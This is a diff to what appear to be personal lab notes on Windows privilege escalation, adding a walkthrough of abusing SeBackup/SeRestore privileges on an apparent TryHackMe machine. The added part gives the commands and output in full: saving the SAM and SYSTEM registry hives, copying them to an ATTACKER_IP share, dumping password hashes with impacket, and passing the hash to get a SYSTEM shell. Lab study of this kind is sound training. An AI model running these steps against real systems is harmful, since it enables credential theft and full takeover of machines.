@@ -476,10 +476,75 @@ nt authority\system
 ## SeBackup / SeRestore Privileges
 * Allows users to read and write to any file in the system.
   * Ignores any DACL in place.
-* Rationale is to allow certain users to perform backups without requireing full admin rights.
+* Rationale is to allow certain users to perform backups without requiring full admin rights.
 * Attacker can trivially escalate privileges with these privileges.
 * Copy SAM and SYSTEM registry hives to extract Administrator's password hash example.
-* 
+1. RDP to target.
+```
+xfreerdp /u:THMBackup /p:CopyMaster555 /v:10.10.21.86
+```
+* "THMBackup" is member of "Backup Operators" group.
+  * Granted SeBackup and SeRestore privileges.
+2. Open command prompt using "Open as administrator" to use the elevated privileges.
+* Check account's privileges.
+```
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeBackupPrivilege             Back up files and directories  Disabled
+SeRestorePrivilege            Restore files and directories  Disabled
+SeShutdownPrivilege           Shut down the system           Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+```
+3. Backup SAM and SYSTEM hashes.
+```
+reg save hklm\system C:\Users\THMBackup\system.hive
+reg save hklm\sam C:\Users\THMBackup\sam.hive
+```
+4. Copy files to attacker machine.
+* Use impacket's `smbserver.py` to start SMB server with a network share.
+```
+mkdir share
+python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+```
+  * Creates share named `public` pointing to 'share' directory.
+  * Directory requires credentials of current Windows session.
+* Transfer both files from target to attacking machine.
+```
+copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
+copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+```
+5. Use impacket to retrieve users' password hashes.
+```
+python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5:::
+```
+* Perform Pass-the-Hash attack to gain access to target with SYSTEM privileges.
+```
+python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.21.86
+Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
+
+[*] Requesting shares on 10.10.21.86.....
+[*] Found writable share ADMIN$
+[*] Uploading file uoQARDky.exe
+[*] Opening SVCManager on 10.10.21.86.....
+[*] Creating service jeuG on 10.10.21.86.....
+[*] Starting service jeuG.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+C:\Windows\system32> whoami
+nt authority\system
+```
 ## SeTakeOwnership
 
 ## SeImpersonate / SeAssignPrimaryToken
